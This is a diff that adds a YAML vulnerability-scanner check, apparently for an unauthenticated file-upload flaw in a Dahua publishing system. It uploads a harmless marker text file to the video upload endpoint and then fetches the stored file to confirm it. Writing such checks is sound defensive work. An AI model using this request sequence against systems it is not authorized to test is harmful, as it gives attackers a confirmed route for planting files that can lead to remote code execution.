@@ -1,0 +1,22 @@
+name: poc-yaml-dahua-upload-rce
+rules:
+    - method: POST
+      path: /publishing/publishing/material/file/video
+      headers:
+          Content-Type: multipart/form-data; boundary=---------------------------376008651130158601163945320856
+      body: "\r\n-----------------------------376008651130158601163945320856\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"demo.txt\"\r\nContent-Type: image/png\r\n\r\n1314520\r\n-----------------------------376008651130158601163945320856\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nsubmit\r\n-----------------------------376008651130158601163945320856--"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'path')
+      search: >-
+        (?P<filen>([a-zA-Z0-9]{18}.txt))
+    - method: GET
+      path: /publishingImg/VIDEO/{{filen}}
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b'1314520')
+        
+detail:
+    author: dahua-upload-rce
+    links:
+        - https://www.baidu.com
+
